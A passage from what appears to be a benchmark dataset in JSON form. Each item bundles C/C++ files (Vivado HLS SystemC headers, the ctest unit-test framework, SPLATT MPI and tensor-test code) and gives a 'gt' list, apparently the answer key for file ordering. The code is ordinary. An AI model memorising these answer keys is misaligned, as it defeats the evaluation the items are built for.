sc_signal< sc_lv<15> > tmp_i_fu_386_p10;\n    static const sc_logic ap_const_logic_1;\n    static const sc_logic ap_const_logic_0;\n    static const sc_lv<10> ap_ST_fsm_state1;\n    static const sc_lv<10> ap_ST_fsm_state2;\n    static const sc_lv<10> ap_ST_fsm_state3;\n    static const sc_lv<10> ap_ST_fsm_state4;\n    static const sc_lv<10> ap_ST_fsm_state5;\n    static const sc_lv<10> ap_ST_fsm_state6;\n    static const sc_lv<10> ap_ST_fsm_state7;\n    static const sc_lv<10> ap_ST_fsm_state8;\n    static const sc_lv<10> ap_ST_fsm_state9;\n    static const sc_lv<10> ap_ST_fsm_state10;\n    static const sc_lv<32> ap_const_lv32_0;\n    static const sc_lv<32> ap_const_lv32_1;\n    static const sc_lv<32> ap_const_lv32_2;\n    static const sc_lv<1> ap_const_lv1_0;\n    static const sc_lv<32> ap_const_lv32_3;\n    static const sc_lv<32> ap_const_lv32_6;\n    static const sc_lv<32> ap_const_lv32_7;\n    static const sc_lv<16> ap_const_lv16_0;\n    static const sc_lv<1> ap_const_lv1_1;\n    static const sc_lv<32> ap_const_lv32_8;\n    static const sc_lv<32> ap_const_lv32_9;\n    static const sc_lv<32> ap_const_lv32_4;\n    static const sc_lv<32> ap_const_lv32_5;\n    static const sc_lv<16> ap_const_lv16_1;\n    static const sc_lv<10> ap_const_lv10_0;\n    static const sc_lv<8> ap_const_lv8_0;\n    static const sc_lv<32> ap_const_lv32_E;\n    static const bool ap_const_boolean_1;\n\n    void thread_ap_clk_no_reset_();\n    void thread_ap_CS_fsm_state1();\n    void thread_ap_CS_fsm_state10();\n    void thread_ap_CS_fsm_state2();\n    void thread_ap_CS_fsm_state3();\n    void thread_ap_CS_fsm_state4();\n    void thread_ap_CS_fsm_state5();\n    void thread_ap_CS_fsm_state6();\n    void thread_ap_CS_fsm_state7();\n    void thread_ap_CS_fsm_state8();\n    void thread_ap_CS_fsm_state9();\n    void thread_ap_done();\n    void thread_ap_idle();\n    void thread_ap_ready();\n    void thread_exitcond1_i_fu_305_p2();\n    void thread_exitcond_i_fu_346_p2();\n    void thread_grp_rgb2yuv_fu_250_ap_start();\n    void thread_grp_yuv2rgb_fu_270_ap_start();\n    void thread_in_channels_ch1_address0();\n    void thread_in_channels_ch1_ce0();\n    void thread_in_channels_ch2_address0();\n    void thread_in_channels_ch2_ce0();\n    void thread_in_channels_ch3_address0();\n    void thread_in_channels_ch3_ce0();\n    void thread_out_channels_ch1_address0();\n    void thread_out_channels_ch1_ce0();\n    void thread_out_channels_ch1_d0();\n    void thread_out_channels_ch1_we0();\n    void thread_out_channels_ch2_address0();\n    void thread_out_channels_ch2_ce0();\n    void thread_out_channels_ch2_d0();\n    void thread_out_channels_ch2_we0();\n    void thread_out_channels_ch3_address0();\n    void thread_out_channels_ch3_ce0();\n    void thread_out_channels_ch3_d0();\n    void thread_out_channels_ch3_we0();\n    void thread_out_height();\n    void thread_out_height_ap_vld();\n    void thread_out_width();\n    void thread_out_width_ap_vld();\n    void thread_p_scale_channels_ch1_address0();\n    void thread_p_scale_channels_ch1_ce0();\n    void thread_p_scale_channels_ch1_we0();\n    void thread_p_scale_channels_ch2_address0();\n    void thread_p_scale_channels_ch2_ce0();\n    void thread_p_scale_channels_ch2_we0();\n    void thread_p_scale_channels_ch3_address0();\n    void thread_p_scale_channels_ch3_ce0();\n    void thread_p_scale_channels_ch3_we0();\n    void thread_p_shl3_cast_fu_332_p3();\n    void thread_p_shl_cast_fu_320_p3();\n    void thread_p_yuv_channels_ch1_address0();\n    void thread_p_yuv_channels_ch1_ce0();\n    void thread_p_yuv_channels_ch1_we0();\n    void thread_p_yuv_channels_ch2_address0();\n    void thread_p_yuv_channels_ch2_ce0();\n    void thread_p_yuv_channels_ch2_we0();\n    void thread_p_yuv_channels_ch3_address0();\n    void thread_p_yuv_channels_ch3_ce0();\n    void thread_p_yuv_channels_ch3_we0();\n    void thread_tmp_1_fu_328_p1();\n    void thread_tmp_1_i_cast_fu_297_p1();\n    void thread_tmp_2_fu_340_p2();\n    void thread_tmp_2_i_cast_fu_301_p1();\n    void thread_tmp_3_cast_fu_366_p1();\n    void thread_tmp_3_fu_361_p2();\n    void thread_tmp_5_i_cast_fu_357_p1();\n    void thread_tmp_7_i_fu_377_p0();\n    void thread_tmp_7_i_fu_377_p1();\n    void thread_tmp_7_i_fu_377_p10();\n    void thread_tmp_7_i_fu_377_p2();\n    void thread_tmp_8_i_fu_395_p0();\n    void thread_tmp_8_i_fu_395_p1();\n    void thread_tmp_8_i_fu_395_p10();\n    void thread_tmp_8_i_fu_395_p2();\n    void thread_tmp_fu_316_p1();\n    void thread_tmp_i_cast_fu_293_p1();\n    void thread_tmp_i_fu_386_p0();\n    void thread_tmp_i_fu_386_p1();\n    void thread_tmp_i_fu_386_p10();\n    void thread_tmp_i_fu_386_p2();\n    void thread_x_fu_310_p2();\n    void thread_y_fu_351_p2();\n    void thread_ap_NS_fsm();\n    void thread_hdltv_gen();\n};\n\n}\n\nusing namespace ap_rtl;\n\n#endif\n\n'High-Level-Synthesis-Flow-on-Zynq-using-Vivado-HLS/source/lab2/yuv_filter.prj/solution1/syn/systemc/yuv_filter_mac_mug8j.h'\n:\n\n\n\n\n\n\n#ifndef __yuv_filter_mac_mug8j__HH__\n#define __yuv_filter_mac_mug8j__HH__\n#include \"simcore_mac_4.h\"\n#include <systemc>\n\ntemplate<\n    int ID,\n    int NUM_STAGE,\n    int din0_WIDTH,\n    int din1_WIDTH,\n    int din2_WIDTH,\n    int dout_WIDTH>\nSC_MODULE(yuv_filter_mac_mug8j) {\n    sc_core::sc_in< sc_dt::sc_lv<din0_WIDTH> >   din0;\n    sc_core::sc_in< sc_dt::sc_lv<din1_WIDTH> >   din1;\n    sc_core::sc_in< sc_dt::sc_lv<din2_WIDTH> >   din2;\n    sc_core::sc_out< sc_dt::sc_lv<dout_WIDTH> >   dout;\n\n\n\n    simcore_mac_4<ID, 1, din0_WIDTH, din1_WIDTH, din2_WIDTH, dout_WIDTH> simcore_mac_4_U;\n\n    SC_CTOR(yuv_filter_mac_mug8j):  simcore_mac_4_U (\"simcore_mac_4_U\") {\n        simcore_mac_4_U.din0(din0);\n        simcore_mac_4_U.din1(din1);\n        simcore_mac_4_U.din2(din2);\n        simcore_mac_4_U.dout(dout);\n\n    }\n\n};\n\n#endif\n",
        "gt": [
            "'High-Level-Synthesis-Flow-on-Zynq-using-Vivado-HLS/source/lab2/yuv_filter.prj/solution1/syn/systemc/yuv_filter_mac_mug8j.h'",
            "'High-Level-Synthesis-Flow-on-Zynq-using-Vivado-HLS/source/lab2/yuv_filter.prj/solution1/syn/systemc/yuv2rgb.h'",
            "'High-Level-Synthesis-Flow-on-Zynq-using-Vivado-HLS/source/lab2/yuv_filter.prj/solution1/syn/systemc/yuv_filter.h'",
            "'High-Level-Synthesis-Flow-on-Zynq-using-Vivado-HLS/source/lab2/yuv_filter_test.c'"
        ]
    },
    {
        "files": [
            "'splatt/tests/ctest/ctest.h'",
            "'splatt/tests/sptensor_test.c'",
            "'splatt/src/splatt_mpi.h'"
        ],
        "content": "'splatt/tests/ctest/ctest.h'\n:\n\n#ifndef CTEST_H\n#define CTEST_H\n\n#ifdef SPLATT_USE_MPI\n#include <mpi.h>\n#endif\n\ntypedef void (*SetupFunc)(void*);\ntypedef void (*TearDownFunc)(void*);\n\nstruct ctest {\n    const char* ssname;\n    const char* ttname;\n    void (*run)();\n    int skip;\n\n    void* data;\n    SetupFunc setup;\n    TearDownFunc teardown;\n\n    unsigned int magic;\n};\n\n#define __FNAME(sname, tname) __ctest_##sname##_##tname##_run\n#define __TNAME(sname, tname) __ctest_##sname##_##tname\n\n#define __CTEST_MAGIC (0xdeadbeef)\n#ifdef __APPLE__\n#define __Test_Section __attribute__ ((unused,section (\"__DATA, .ctest\")))\n#else\n#define __Test_Section __attribute__ ((unused,section (\".ctest\")))\n#endif\n\n#define __CTEST_STRUCT(sname, tname, _skip, __data, __setup, __teardown) \\\n    struct ctest __TNAME(sname, tname) __Test_Section = { \\\n        .ssname=#sname, \\\n        .ttname=#tname, \\\n        .run = __FNAME(sname, tname), \\\n        .skip = _skip, \\\n        .data = __data, \\\n        .setup = (SetupFunc)__setup,\t\t\t\t\t\\\n        .teardown = (TearDownFunc)__teardown,\t\t\t\t\\\n        .magic = __CTEST_MAGIC };\n\n#define CTEST_DATA(sname) struct sname##_data\n\n#define CTEST_SETUP(sname) \\\n    void __attribute__ ((weak)) sname##_setup(struct sname##_data* data)\n\n#define CTEST_TEARDOWN(sname) \\\n    void __attribute__ ((weak)) sname##_teardown(struct sname##_data* data)\n\n#define __CTEST_INTERNAL(sname, tname, _skip) \\\n    void __FNAME(sname, tname)(); \\\n    __CTEST_STRUCT(sname, tname, _skip, NULL, NULL, NULL) \\\n    void __FNAME(sname, tname)()\n\n#ifdef __APPLE__\n#define SETUP_FNAME(sname) NULL\n#define TEARDOWN_FNAME(sname) NULL\n#else\n#define SETUP_FNAME(sname) sname##_setup\n#define TEARDOWN_FNAME(sname) sname##_teardown\n#endif\n\n#define __CTEST2_INTERNAL(sname, tname, _skip) \\\n    static struct sname##_data  __ctest_##sname##_data; \\\n    CTEST_SETUP(sname); \\\n    CTEST_TEARDOWN(sname); \\\n    void __FNAME(sname, tname)(struct sname##_data* data); \\\n    __CTEST_STRUCT(sname, tname, _skip, &__ctest_##sname##_data, SETUP_FNAME(sname), TEARDOWN_FNAME(sname)) \\\n    void __FNAME(sname, tname)(struct sname##_data* data)\n\n\nvoid CTEST_LOG(char *fmt, ...);\nvoid CTEST_ERR(char *fmt, ...);\n\n#define CTEST(sname, tname) __CTEST_INTERNAL(sname, tname, 0)\n#define CTEST_SKIP(sname, tname) __CTEST_INTERNAL(sname, tname, 1)\n\n#define CTEST2(sname, tname) __CTEST2_INTERNAL(sname, tname, 0)\n#define CTEST2_SKIP(sname, tname) __CTEST2_INTERNAL(sname, tname, 1)\n\n\nvoid assert_str(const char* exp, const char* real, const char* caller, int line);\n#define ASSERT_STR(exp, real) assert_str(exp, real, __FILE__, __LINE__)\n\nvoid assert_data(const unsigned char* exp, int expsize,\n                 const unsigned char* real, int realsize,\n                 const char* caller, int line);\n#define ASSERT_DATA(exp, expsize, real, realsize) \\\n    assert_data(exp, expsize, real, realsize, __FILE__, __LINE__)\n\nvoid assert_equal(long exp, long real, const char* caller, int line);\n#define ASSERT_EQUAL(exp, real) assert_equal(exp, real, __FILE__, __LINE__)\n\nvoid assert_not_equal(long exp, long real, const char* caller, int line);\n#define ASSERT_NOT_EQUAL(exp, real) assert_not_equal(exp, real, __FILE__, __LINE__)\n\nvoid assert_null(void* real, const char* caller, int line);\n#define ASSERT_NULL(real) assert_null((void*)real, __FILE__, __LINE__)\n\nvoid assert_not_null(const void* real, const char* caller, int line);\n#define ASSERT_NOT_NULL(real) assert_not_null(real, __FILE__, __LINE__)\n\nvoid assert_true(int real, const char* caller, int line);\n#define ASSERT_TRUE(real) assert_true(real, __FILE__, __LINE__)\n\nvoid assert_false(int real, const char* caller, int line);\n#define ASSERT_FALSE(real) assert_false(real, __FILE__, __LINE__)\n\nvoid assert_fail(const char* caller, int line);\n#define ASSERT_FAIL() assert_fail(__FILE__, __LINE__)\n\nvoid assert_dbl_near(double exp, double real, double tol, const char* caller, int line);\n#define ASSERT_DBL_NEAR(exp, real) assert_dbl_near(exp, real, 1e-4, __FILE__, __LINE__)\n#define ASSERT_DBL_NEAR_TOL(exp, real, tol) assert_dbl_near(exp, real, tol, __FILE__, __LINE__)\n\nvoid assert_dbl_far(double exp, double real, double tol, const char* caller, int line);\n#define ASSERT_DBL_FAR(exp, real) assert_dbl_far(exp, real, 1e-4, __FILE__, __LINE__)\n#define ASSERT_DBL_FAR_TOL(exp, real, tol) assert_dbl_far(exp, real, tol, __FILE__, __LINE__)\n\n#ifdef CTEST_MAIN\n\n#include <setjmp.h>\n#include <stdarg.h>\n#include <stdio.h>\n#include <string.h>\n#include <sys/time.h>\n#include <inttypes.h>\n#include <unistd.h>\n#include <stdint.h>\n#include <stdlib.h>\n\n#ifdef __APPLE__\n#include <dlfcn.h>\n#endif\n\n\n\nstatic size_t ctest_errorsize;\nstatic char* ctest_errormsg;\n#define MSG_SIZE 4096\nstatic char ctest_errorbuffer[MSG_SIZE];\nstatic jmp_buf ctest_err;\nstatic int color_output = 1;\nstatic const char* suite_name;\n\ntypedef int (*filter_func)(struct ctest*);\n\n#define ANSI_BLACK    \"\\033[0;30m\"\n#define ANSI_RED      \"\\033[0;31m\"\n#define ANSI_GREEN    \"\\033[0;32m\"\n#define ANSI_YELLOW   \"\\033[0;33m\"\n#define ANSI_BLUE     \"\\033[0;34m\"\n#define ANSI_MAGENTA  \"\\033[0;35m\"\n#define ANSI_CYAN     \"\\033[0;36m\"\n#define ANSI_GREY     \"\\033[0;37m\"\n#define ANSI_DARKGREY \"\\033[01;30m\"\n#define ANSI_BRED     \"\\033[01;31m\"\n#define ANSI_BGREEN   \"\\033[01;32m\"\n#define ANSI_BYELLOW  \"\\033[01;33m\"\n#define ANSI_BBLUE    \"\\033[01;34m\"\n#define ANSI_BMAGENTA \"\\033[01;35m\"\n#define ANSI_BCYAN    \"\\033[01;36m\"\n#define ANSI_WHITE    \"\\033[01;37m\"\n#define ANSI_NORMAL   \"\\033[0m\"\n\nstatic CTEST(suite, test) { }\n\nstatic void msg_start(const char* color, const char* title) {\n    int size;\n    if (color_output) {\n        size = snprintf(ctest_errormsg, ctest_errorsize, \"%s\", color);\n        ctest_errorsize -= size;\n        ctest_errormsg += size;\n    }\n    size = snprintf(ctest_errormsg, ctest_errorsize, \"  %s: \", title);\n    ctest_errorsize -= size;\n    ctest_errormsg += size;\n}\n\nstatic void msg_end() {\n    int size;\n    if (color_output) {\n        size = snprintf(ctest_errormsg, ctest_errorsize, ANSI_NORMAL);\n        ctest_errorsize -= size;\n        ctest_errormsg += size;\n    }\n    size = snprintf(ctest_errormsg, ctest_errorsize, \"\\n\");\n    ctest_errorsize -= size;\n    ctest_errormsg += size;\n}\n\nvoid CTEST_LOG(char *fmt, ...)\n{\n    va_list argp;\n    msg_start(ANSI_BLUE, \"LOG\");\n\n    va_start(argp, fmt);\n    int size = vsnprintf(ctest_errormsg, ctest_errorsize, fmt, argp);\n    ctest_errorsize -= size;\n    ctest_errormsg += size;\n    va_end(argp);\n\n    msg_end();\n}\n\nvoid CTEST_ERR(char *fmt, ...)\n{\n    va_list argp;\n    msg_start(ANSI_YELLOW, \"ERR\");\n\n    va_start(argp, fmt);\n    int size = vsnprintf(ctest_errormsg, ctest_errorsize, fmt, argp);\n    ctest_errorsize -= size;\n    ctest_errormsg += size;\n    va_end(argp);\n\n    msg_end();\n    longjmp(ctest_err, 1);\n}\n\nvoid assert_str(const char* exp, const char*  real, const char* caller, int line) {\n    if ((exp == NULL && real != NULL) ||\n        (exp != NULL && real == NULL) ||\n        (exp && real && strcmp(exp, real) != 0)) {\n        CTEST_ERR(\"%s:%d  expected '%s', got '%s'\", caller, line, exp, real);\n    }\n}\n\nvoid assert_data(const unsigned char* exp, int expsize,\n                 const unsigned char* real, int realsize,\n                 const char* caller, int line) {\n    int i;\n    if (expsize != realsize) {\n        CTEST_ERR(\"%s:%d  expected %d bytes, got %d\", caller, line, expsize, realsize);\n    }\n    for (i=0; i<expsize; i++) {\n        if (exp[i] != real[i]) {\n            CTEST_ERR(\"%s:%d expected 0x%02x at offset %d got 0x%02x\",\n                caller, line, exp[i], i, real[i]);\n        }\n    }\n}\n\nvoid assert_equal(long exp, long real, const char* caller, int line) {\n    if (exp != real) {\n        CTEST_ERR(\"%s:%d  expected %ld, got %ld\", caller, line, exp, real);\n    }\n}\n\nvoid assert_not_equal(long exp, long real, const char* caller, int line) {\n    if ((exp) == (real)) {\n        CTEST_ERR(\"%s:%d  should not be %ld\", caller, line, real);\n    }\n}\n\nvoid assert_dbl_near(double exp, double real, double tol, const char* caller, int line) {\n    double diff = exp - real;\n    double absdiff = diff;\n\n    if(diff < 0) {\n      absdiff *= -1;\n    }\n    if (absdiff > tol) {\n        CTEST_ERR(\"%s:%d  expected %0.3e, got %0.3e (diff %0.3e, tol %0.3e)\", caller, line, exp, real, diff, tol);\n    }\n}\n\nvoid assert_dbl_far(double exp, double real, double tol, const char* caller, int line) {\n    double diff = exp - real;\n    double absdiff = diff;\n\n    if(diff < 0) {\n      absdiff *= -1;\n    }\n    if (absdiff <= tol) {\n        CTEST_ERR(\"%s:%d  expected %0.3e, got %0.3e (diff %0.3e, tol %0.3e)\", caller, line, exp, real, diff, tol);\n    }\n}\n\nvoid assert_null(void* real, const char* caller, int line) {\n    if ((real) != NULL) {\n        CTEST_ERR(\"%s:%d  should be NULL\", caller, line);\n    }\n}\n\nvoid assert_not_null(const void* real, const char* caller, int line) {\n    if (real == NULL) {\n        CTEST_ERR(\"%s:%d  should not be NULL\", caller, line);\n    }\n}\n\nvoid assert_true(int real, const char* caller, int line) {\n    if ((real) == 0) {\n        CTEST_ERR(\"%s:%d  should be true\", caller, line);\n    }\n}\n\nvoid assert_false(int real, const char* caller, int line) {\n    if ((real) != 0) {\n        CTEST_ERR(\"%s:%d  should be false\", caller, line);\n    }\n}\n\nvoid assert_fail(const char* caller, int line) {\n    CTEST_ERR(\"%s:%d  shouldn't come here\", caller, line);\n}\n\n\nstatic int suite_all(struct ctest* t) {\n    return 1;\n}\n\nstatic int suite_filter(struct ctest* t) {\n    return strncmp(suite_name, t->ssname, strlen(suite_name)) == 0;\n}\n\nstatic uint64_t getCurrentTime() {\n    struct timeval now;\n    gettimeofday(&now, NULL);\n    uint64_t now64 = now.tv_sec;\n    now64 *= 1000000;\n    now64 += (now.tv_usec);\n    return now64;\n}\n\nstatic void color_print(const char* color, const char* text) {\n#ifdef SPLATT_USE_MPI\n  int rank = 0;\n  MPI_Comm_rank(MPI_COMM_WORLD, &rank);\n  if(rank > 0) {\n    return;\n  }\n#endif\n\n    if (color_output)\n        printf(\"%s%s\"ANSI_NORMAL\"\\n\", color, text);\n    else\n        printf(\"%s\\n\", text);\n}\n\n#ifdef __APPLE__\nstatic void *find_symbol(struct ctest *test, const char *fname)\n{\n    size_t len = strlen(test->ssname) + 1 + strlen(fname);\n    char *symbol_name = (char *) malloc(len + 1);\n    memset(symbol_name, 0, len + 1);\n    snprintf(symbol_name, len + 1, \"%s_%s\", test->ssname, fname);\n\n\n    void *symbol = dlsym(RTLD_DEFAULT, symbol_name);\n    if (!symbol) {\n\n    }\n\n\n    free(symbol_name);\n    return symbol;\n}\n#endif\n\n#ifdef CTEST_SEGFAULT\n#include <signal.h>\nstatic void sighandler(int signum)\n{\n    char msg[128];\n    sprintf(msg, \"[SIGNAL %d: %s]\", signum, strsignal(signum));\n    color_print(ANSI_BRED, msg);\n    fflush(stdout);\n\n\n    signal(signum, SIG_DFL);\n    kill(getpid(), signum);\n}\n#endif\n\nint ctest_main(int argc, const char *argv[])\n{\n    static int total = 0;\n    static int num_ok = 0;\n    static int num_fail = 0;\n    static int num_skip = 0;\n    static int index = 1;\n    static filter_func filter = suite_all;\n\n    int rank = 0;\n#ifdef SPLATT_USE_MPI\n    MPI_Comm_rank(MPI_COMM_WORLD, &rank);\n#endif\n\n#ifdef CTEST_SEGFAULT\n    signal(SIGSEGV, sighandler);\n#endif\n\n    if (argc == 2) {\n        suite_name = argv[1];\n        filter = suite_filter;\n    }\n\n    color_output = isatty(1);\n    uint64_t t1 = getCurrentTime();\n\n    struct ctest* ctest_begin = &__TNAME(suite, test);\n    struct ctest* ctest_end = &__TNAME(suite, test);\n\n    while (1) {\n        struct ctest* t = ctest_begin-1;\n        if (t->magic != __CTEST_MAGIC) break;\n        ctest_begin--;\n    }\n    while (1) {\n        struct ctest* t = ctest_end+1;\n        if (t->magic != __CTEST_MAGIC) break;\n        ctest_end++;\n    }\n    ctest_end++;\n\n    static struct ctest* test;\n    for (test = ctest_begin; test != ctest_end; test++) {\n        if (test == &__ctest_suite_test) continue;\n        if (filter(test)) total++;\n    }\n\n    for (test = ctest_begin; test != ctest_end; test++) {\n        if (test == &__ctest_suite_test) continue;\n        if (filter(test)) {\n            ctest_errorbuffer[0] = 0;\n            ctest_errorsize = MSG_SIZE-1;\n            ctest_errormsg = ctest_errorbuffer;\n            if(rank == 0) {\n              printf(\"TEST %d/%d %s:%s \", index, total, test->ssname, test->ttname);\n              fflush(stdout);\n            }\n            if (test->skip) {\n                color_print(ANSI_BYELLOW, \"[SKIPPED]\");\n                num_skip++;\n            } else {\n                int result = setjmp(ctest_err);\n                if (result == 0) {\n#ifdef __APPLE__\n                    if (!test->setup) {\n                        test->setup = find_symbol(test, \"setup\");\n                    }\n                    if (!test->teardown) {\n                        test->teardown = find_symbol(test, \"teardown\");\n                    }\n#endif\n\n                    if (test->setup) test->setup(test->data);\n                    if (test->data)\n                      test->run(test->data);\n                    else\n                      test->run();\n                    if (test->teardown) test->teardown(test->data);\n\n#ifdef COLOR_OK\n                    color_print(ANSI_BGREEN, \"[OK]\");\n#else\n                    if(rank == 0) {\n                      printf(\"[OK]\\n\");\n                    }\n#endif\n                    num_ok++;\n                } else {\n                    color_print(ANSI_BRED, \"[FAIL]\");\n                    num_fail++;\n                }\n                if (ctest_errorsize != MSG_SIZE-1) printf(\"%s\", ctest_errorbuffer);\n            }\n            index++;\n        }\n    }\n    uint64_t t2 = getCurrentTime();\n\n    const char* color = (num_fail) ? ANSI_BRED : ANSI_GREEN;\n    char results[80];\n    sprintf(results, \"RESULTS: %d tests (%d ok, %d failed, %d skipped) ran in %\"PRIu64\" ms\", total, num_ok, num_fail, num_skip, (t2 - t1)/1000);\n    color_print(color, results);\n    return num_fail;\n}\n\n#endif\n\n#endif\n\n\n'splatt/tests/sptensor_test.c'\n:\n#include \"../src/sptensor.h\"\n\n#include \"ctest/ctest.h\"\n\n#include \"splatt_test.h\"\n\n\nCTEST_DATA(sptensor)\n{\n  idx_t ntensors;\n  sptensor_t * tensors[MAX_DSETS];\n};\n\n\nCTEST_SETUP(sptensor)\n{\n  data->ntensors = sizeof(datasets) / sizeof(datasets[0]);\n  for(idx_t i=0; i < data->ntensors; ++i) {\n    data->tensors[i] = tt_read(datasets[i]);\n  }\n}\n\nCTEST_TEARDOWN(sptensor)\n{\n  for(idx_t i=0; i < data->ntensors; ++i) {\n    tt_free(data->tensors[i]);\n  }\n}\n\n\nCTEST2(sptensor, tt_fill)\n{\n  for(idx_t i=0; i < data->ntensors; ++i) {\n    sptensor_t * gold = data->tensors[i];\n\n\n    sptensor_t test;\n    tt_fill(&test, gold->nnz, gold->nmodes, gold->ind, gold->vals);\n\n    ASSERT_EQUAL(gold->nnz, test.nnz);\n    ASSERT_EQUAL(gold->nmodes, test.nmodes);\n    for(idx_t m=0; m < gold->nmodes; ++m) {\n      ASSERT_EQUAL(gold->dims[m], test.dims[m]);\n    }\n\n    splatt_free(test.dims);\n  }\n}\n\n\n'splatt/src/splatt_mpi.h'\n:#ifndef SPLATT_MPI_H\n#define SPLATT_MPI_H\n\n\n# ifndef SPLATT_USE_MPI\n\ntypedef struct\n{\n  int rank;\n} rank_info;\n# else\n\n\n\n\n\n#include \"base.h\"\n#include <mpi.h>\n\n\n\n\n\ntypedef struct\n{\n\n  idx_t nmodes;\n  idx_t global_nnz;\n  idx_t global_dims[MAX_NMODES];\n  idx_t mat_start[MAX_NMODES];\n  idx_t mat_end[MAX_NMODES];\n  idx_t layer_starts[MAX_NMODES];\n  idx_t layer_ends[MAX_NMODES];\n\n\n  idx_t nowned[MAX_NMODES];\n  idx_t ownstart[MAX_NMODES];\n  idx_t ownend[MAX_NMODES];\n\n  idx_t * indmap[MAX_NMODES];\n\n\n  idx_t * mat_ptrs[MAX_NMODES];\n  idx_t * layer_ptrs[MAX_NMODES];\n\n\n  splatt_decomp_type decomp;\n\n\n\n  idx_t nlocal2nbr[MAX_NMODES];\n  idx_t nnbr2globs[MAX_NMODES];\n  idx_t * nbr2globs_inds[MAX_NMODES];\n  idx_t * local2nbr_inds[MAX_NMODES];\n  idx_t * nbr2local_inds[MAX_NMODES];\n  int   * local2nbr_ptr[MAX_NMODES];\n  int   * nbr2globs_ptr[MAX_NMODES];\n  int   * local2nbr_disp[MAX_NMODES];\n  int   * nbr2globs_disp[MAX_NMODES];\n\n\n\n  MPI_Comm comm_3d;\n  MPI_Comm layer_comm[MAX_NMODES];\n\n\n  int rank;\n  int npes;\n  int rank_3d;\n  int dims_3d[MAX_NMODES];\n  int coords_3d[MAX_NMODES];\n  int layer_rank[MAX_NMODES];\n  int layer_size[MAX_NMODES];\n\n\n  MPI_Status status;\n  MPI_Request req;\n  MPI_Status * stats;\n  MPI_Request * send_reqs;\n  MPI_Request * recv_reqs;\n\n  idx_t worksize;\n} rank_info;\n\n\n\n\n#include \"sptensor.h\"\n#include \"reorder.h\"\n\n\n\n\n\n#define mpi_cpd_als_iterate splatt_mpi_cpd_als_iterate\ndouble mpi_cpd_als_iterate(\n  splatt_csf const * const tensors,\n  matrix_t ** mats,\n  matrix_t ** globmats,\n  val_t * const lambda,\n  idx_t const nfactors,\n  rank_info * const rinfo,\n  double const * const opts);\n\n\n#define mpi_update_rows splatt_mpi_update_rows\n\nvoid mpi_update_rows(\n  idx_t const * const indmap,\n  val_t * const restrict nbr2globs_buf,\n  val_t * const restrict nbr2local_buf,\n  matrix_t * const localmat,\n  matrix_t * const globalmat,\n  rank_info * const rinfo,\n  idx_t const nfactors,\n  idx_t const mode,\n  splatt_comm_type const which);\n\n\n#define mpi_reduce_rows splatt_mpi_reduce_rows\n\nvoid mpi_reduce_rows(\n  val_t * const restrict local2nbr_buf,\n  val_t * const restrict nbr2globs_buf,\n  matrix_t const * const localmat,\n  matrix_t * const globalmat,\n  rank_info * const rinfo,\n  idx_t const nfactors,\n  idx_t const mode,\n  splatt_comm_type const which);\n\n\n#define mpi_add_my_partials splatt_mpi_add_my_partials\n\nvoid mpi_add_my_partials(\n  idx_t const * const indmap,\n  matrix_t const * const localmat,\n  matrix_t * const globmat,\n  rank_info const * const rinfo,\n  idx_t const nfactors,\n  idx_t const mode);\n\n\n#define mpi_write_mats splatt_mpi_write_mats\n\nvoid mpi_write_mats(\n  matrix_t ** mats,\n  permutation_t const * const perm,\n  rank_info const * const rinfo,\n  char const * const basename,\n  idx_t const nmodes);\n\n\n#define mpi_write_part splatt_mpi_write_part\n\nvoid mpi_write_part(\n  sptensor_t const * const tt,\n  permutation_t const * const perm,\n  rank_info const * const rinfo);\n\n\n#define mpi_compute_ineed splatt_mpi_compute_ineed\n\nvoid mpi_compute_ineed(\n  rank_info * const rinfo,\n  sptensor_t const * const tt,\n  idx_t const mode,\n  idx_t const nfactors,\n  splatt_decomp_type const distribution);\n\n\n#define mpi_tt_read splatt_mpi_tt_read\n\nsptensor_t * mpi_tt_read(\n  char const * const ifname,\n  char const * const pfname,\n  rank_info * const rinfo);\n\n\n\n#define mpi_simple_distribute splatt_mpi_simple_distribute\n\nsptensor_t * mpi_simple_distribute(\n  char const * const ifname,\n  MPI_Comm comm);\n\n\n\n#define mpi_rearrange_by_part splatt_mpi_rearrange_by_part\n\nsptensor_t * mpi_rearrange_by_part(\n  sptensor_t const * const ttbuf,\n  int const * const parts,\n  MPI_Comm comm);\n\n\n#define mpi_determine_med_owner splatt_mpi_determine_med_owner\n\nint mpi_determine_med_owner(\n  sptensor_t * const ttbuf,\n  idx_t const n,\n  rank_info * const rinfo);\n\n\n#define mpi_filter_tt_1d splatt_mpi_filter_tt_1d\n\nvoid mpi_filter_tt_1d(\n  idx_t const mode,\n  sptensor_t const * const tt,\n  sptensor_t * const ftt,\n  idx_t start,\n  idx_t end);\n\n\n#define mpi_distribute_mats splatt_mpi_distribute_mats\n\npermutation_t *  mpi_distribute_mats(\n  rank_info * const rinfo,\n  sptensor_t * const tt,\n  splatt_decomp_type const distribution);\n\n\n\n#define mpi_mat_rand splatt_mpi_mat_rand\n\nmatrix_t * mpi_mat_rand(\n  idx_t const mode,\n  idx_t const nfactors,\n  permutation_t const * const perm,\n  rank_info * const rinfo);\n\n\n\n#define mpi_find_owned splatt_mpi_find_owned\n\nvoid mpi_find_owned(\n  sptensor_t const * const tt,\n  idx_t const mode,\n  rank_info * const rinfo);\n\n\n#define mpi_cpy_indmap splatt_mpi_cpy_indmap\n\nvoid mpi_cpy_indmap(\n  sptensor_t const * const tt,\n  rank_info * const rinfo,\n  idx_t const mode);\n\n\n#define mpi_setup_comms splatt_mpi_setup_comms\n\nvoid mpi_setup_comms(\n  rank_info * const rinfo);\n\n\n#define rank_free splatt_rank_free\n\nvoid rank_free(\n  rank_info rinfo,\n  idx_t const nmodes);\n\n\n#define mpi_time_stats splatt_mpi_time_stats\n\nvoid mpi_time_stats(\n  rank_info const * const rinfo);\n\n\n#define mpi_send_recv_stats splatt_mpi_send_recv_stats\n\nvoid mpi_send_recv_stats(\n  rank_info const * const rinfo,\n  sptensor_t const * const tt);\n\n#endif\n#endif\n",
        "gt": [
            "'splatt/src/splatt_mpi.h'",
            "'splatt/tests/ctest/ctest.h'",
            "'splatt/tests/sptensor_test.c'"
        ]
    },
    {
        "files": [
            "'txproto/src/include/libtxproto/log.h'",
            "'txproto/src/link.c'",
            "'txproto/src/include/libtxproto/filter.h'"
        ],
